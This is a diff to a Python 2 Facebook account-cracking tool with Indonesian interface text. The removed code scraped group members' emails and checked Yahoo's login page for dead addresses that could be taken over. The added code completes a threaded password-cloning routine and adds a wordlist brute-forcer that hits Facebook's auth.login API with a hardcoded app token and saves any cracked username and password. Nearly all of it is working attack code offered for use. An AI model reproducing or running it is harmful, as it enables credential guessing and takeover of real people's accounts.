@@ -850,112 +850,77 @@ def clone_dari_member_group():
 																cek.write(user+"|"+pass11+"\n")
 																cek.close()
 																cekpoint.append(user+pass11)
-	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
-	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
-	kimak = json.loads(teman.text)
-	save = open('out/GrupMailVuln.txt','w')
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
-	for w in kimak['data']:
-		jml +=1
-		mpsh.append(jml)
-		id = w['id']
-		nama = w['name']
-		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
-		z = json.loads(links.text)
-		try:
-			mail = z['email']
-			yahoo = re.compile(r'@.*')
-			otw = yahoo.search(mail).group()
-			if 'yahoo.com' in otw:
-				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-				br._factory.is_html = True
-				br.select_form(nr=0)
-				br["username"] = mail
-				klik = br.submit().read()
-				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-				try:
-					pek = jok.search(klik).group()
-				except:
-					continue
-				if '"messages.ERROR_INVALID_USERNAME">' in pek:
-					save.write("Nama: "+ nama +"ID :" + id +"Email: "+ mail + '\n')
-					print("\033[1;96m[\033[1;97mVULN✓\033[1;96m] \033[1;92m" +mail+" \033[1;96m=>\x1b[1;97m"+nama)
-					berhasil.append(mail)
-		except KeyError:
+	except:																		
 			pass
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-	menu()
-
-
-def clone_dari_file():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		os.mkdir('out')
-	except OSError:
-		pass
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	files = raw_input("\033[1;96m[+] \033[1;93mNama File \033[1;91m: \033[1;97m")
-	try:
-		total = open(files,"r")
-		mail = total.readlines()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
-		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-		menu()
-	mpsh = []
-	jml = 0
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	save = open('out/FileMailVuln.txt','w')
-	print 42*"\033[1;96m="
-	mail = open(files,"r").readlines()
-	for pw in mail:
-		mail = pw.replace("\n","")
-		jml +=1
-		mpsh.append(jml)
-		yahoo = re.compile(r'@.*')
-		otw = yahoo.search(mail).group()
-		if 'yahoo.com' in otw:
-			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-			br._factory.is_html = True
-			br.select_form(nr=0)
-			br["username"] = mail
-			klik = br.submit().read()
-			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-			try:
-				pek = jok.search(klik).group()
-			except:
-				continue
-			if '"messages.ERROR_INVALID_USERNAME">' in pek:
-				save.write(mail + '\n')
-				print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail)
-				berhasil.append(mail)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-	menu()
-	
-       
 		
+	p = ThreadPool(30)
+	p.map(main, id) 
+	print '\x1b[1;36;40m '
+	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
+	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
+	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
+	
+	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
+	super()
+
+def brute():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.5)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+        try:
+            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
+            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            total = open(passw, 'r')
+            total = total.readlines()
+            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            sandi = open(passw, 'r')
+            for pw in sandi:
+                try:
+                    pw = pw.replace('\n', '')
+                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
+                    sys.stdout.flush()
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    mpsh = json.loads(data.text)
+                    if 'access_token' in mpsh:
+                        dapat = open('Brute.txt', 'w')
+                        dapat.write(email + ' | ' + pw + '\n')
+                        dapat.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print 52 * '\x1b[1;97m\xe2\x95\x90'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                        keluar()
+                    else:
+                        if 'www.facebook.com' in mpsh['error_msg']:
+                            ceks = open('Brutecekpoint.txt', 'w')
+                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.close()
+                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                            keluar()
+                except requests.exceptions.ConnectionError:
+                    print '\x1b[1;91m[!] Connection Error'
+                    time.sleep(1)
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found...'
+            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
+            super()
+
 if __name__ == '__main__':
-	login()
+	methodlogin()
